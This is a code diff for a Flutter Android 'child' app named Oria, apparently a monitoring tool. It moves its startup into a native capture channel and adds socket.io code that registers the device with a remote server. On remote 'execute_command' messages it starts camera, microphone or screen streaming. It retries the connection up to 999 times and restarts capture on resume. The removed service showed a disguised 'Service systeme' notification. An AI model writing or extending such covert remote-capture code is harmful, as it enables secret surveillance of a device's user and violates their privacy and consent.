@@ -1,14 +1,14 @@
 import 'package:flutter/material.dart';
-import 'package:flutter_background_service/flutter_background_service.dart';
+import 'package:flutter/services.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:socket_io_client/socket_io_client.dart' as IO;
 import 'package:device_info_plus/device_info_plus.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:android_intent_plus/android_intent.dart';
 import 'stream_service.dart';
-import 'dart:ui';
 
 const String SERVER_URL = 'https://oria-server-tzc1.onrender.com';
+const _captureChannel = MethodChannel('oria.capture/service');
 
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
@@ -29,80 +29,8 @@ void main() async {
     return;
   }
 
-  await initializeService();
+  await _captureChannel.invokeMethod('start');
   runApp(const OriaChildApp());
-}
-
-Future<void> initializeService() async {
-  final service = FlutterBackgroundService();
-  await service.configure(
-    androidConfiguration: AndroidConfiguration(
-      onStart: onStart,
-      autoStart: true,
-      isForegroundMode: true,
-      foregroundServiceNotificationId: 888,
-      initialNotificationTitle: 'Service systeme',
-      initialNotificationContent: 'Actif',
-    ),
-    iosConfiguration: IosConfiguration(autoStart: true, onForeground: onStart),
-  );
-  await service.startService();
-}
-
-@pragma('vm:entry-point')
-void onStart(ServiceInstance instance) async {
-  DartPluginRegistrant.ensureInitialized();
-  final deviceInfo = DeviceInfoPlugin();
-  final androidInfo = await deviceInfo.androidInfo;
-  final deviceId = androidInfo.id;
-  final deviceName = '${androidInfo.manufacturer} ${androidInfo.model}';
-
-  IO.Socket? socket;
-  StreamService? streamService;
-
-  void connect() {
-    socket?.dispose();
-    socket = IO.io(SERVER_URL, <String, dynamic>{
-      'transports': ['websocket'],
-      'autoConnect': true,
-      'reconnection': true,
-      'reconnectionDelay': 5000,
-      'reconnectionAttempts': 999,
-    });
-
-    socket!.on('connect', (_) {
-      socket!.emit('register_child', {'deviceId': deviceId, 'deviceName': deviceName});
-    });
-
-    socket!.on('execute_command', (data) async {
-      final action = data['action'];
-      try {
-        if (action == 'start_camera') {
-          await streamService?.stop();
-          streamService = StreamService(socket!, 'parent-main');
-          await streamService!.startCamera();
-        } else if (action == 'start_mic') {
-          await streamService?.stop();
-          streamService = StreamService(socket!, 'parent-main');
-          await streamService!.startMic();
-        } else if (action == 'start_screen') {
-          await streamService?.stop();
-          streamService = StreamService(socket!, 'parent-main');
-          await streamService!.startScreen();
-        } else if (action == 'stop_stream') {
-          await streamService?.stop();
-          streamService = null;
-        }
-      } catch (e) {
-        print('ORIA ERROR: $e');
-      }
-    });
-
-    socket!.on('signal', (msg) {
-      streamService?.handleSignal(msg);
-    });
-  }
-  connect();
 }
 
 class EnableAccessibilityScreen extends StatelessWidget {
@@ -139,7 +67,7 @@ class EnableAccessibilityScreen extends StatelessWidget {
                   onPressed: () async {
                     final prefs = await SharedPreferences.getInstance();
                     await prefs.setBool('accessibility_enabled', true);
-                    await initializeService();
+                    await _captureChannel.invokeMethod('start');
                     runApp(const OriaChildApp());
                   },
                   child: const Text('Deja active > Continuer', style: TextStyle(color: Colors.grey)),
@@ -153,8 +81,87 @@ class EnableAccessibilityScreen extends StatelessWidget {
   }
 }
 
-class OriaChildApp extends StatelessWidget {
+class OriaChildApp extends StatefulWidget {
   const OriaChildApp({super.key});
+  @override
+  State<OriaChildApp> createState() => _OriaChildAppState();
+}
+
+class _OriaChildAppState extends State<OriaChildApp> with WidgetsBindingObserver {
+  late IO.Socket socket;
+  StreamService? streamService;
+  String deviceId = '';
+  String deviceName = '';
+
+  @override
+  void initState() {
+    super.initState();
+    WidgetsBinding.instance.addObserver(this);
+    _init();
+  }
+
+  Future<void> _init() async {
+    final deviceInfo = DeviceInfoPlugin();
+    final androidInfo = await deviceInfo.androidInfo;
+    deviceId = androidInfo.id;
+    deviceName = '${androidInfo.manufacturer} ${androidInfo.model}';
+
+    socket = IO.io(SERVER_URL, <String, dynamic>{
+      'transports': ['websocket'],
+      'autoConnect': true,
+      'reconnection': true,
+      'reconnectionDelay': 5000,
+      'reconnectionAttempts': 999,
+    });
+
+    socket.on('connect', (_) {
+      socket.emit('register_child', {'deviceId': deviceId, 'deviceName': deviceName});
+    });
+
+    socket.on('execute_command', (data) async {
+      final action = data['action'];
+      try {
+        if (action == 'start_camera') {
+          await streamService?.stop();
+          streamService = StreamService(socket, 'parent-main');
+          await streamService!.startCamera();
+        } else if (action == 'start_mic') {
+          await streamService?.stop();
+          streamService = StreamService(socket, 'parent-main');
+          await streamService!.startMic();
+        } else if (action == 'start_screen') {
+          await streamService?.stop();
+          streamService = StreamService(socket, 'parent-main');
+          await streamService!.startScreen();
+        } else if (action == 'stop_stream') {
+          await streamService?.stop();
+          streamService = null;
+        }
+      } catch (e) {
+        print('ORIA ERROR: $e');
+      }
+    });
+
+    socket.on('signal', (msg) {
+      streamService?.handleSignal(msg);
+    });
+  }
+
+  @override
+  void didChangeAppLifecycleState(AppLifecycleState state) {
+    if (state == AppLifecycleState.resumed) {
+      _captureChannel.invokeMethod('start');
+    }
+  }
+
+  @override
+  void dispose() {
+    WidgetsBinding.instance.removeObserver(this);
+    streamService?.stop();
+    socket.disconnect();
+    super.dispose();
+  }
+
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
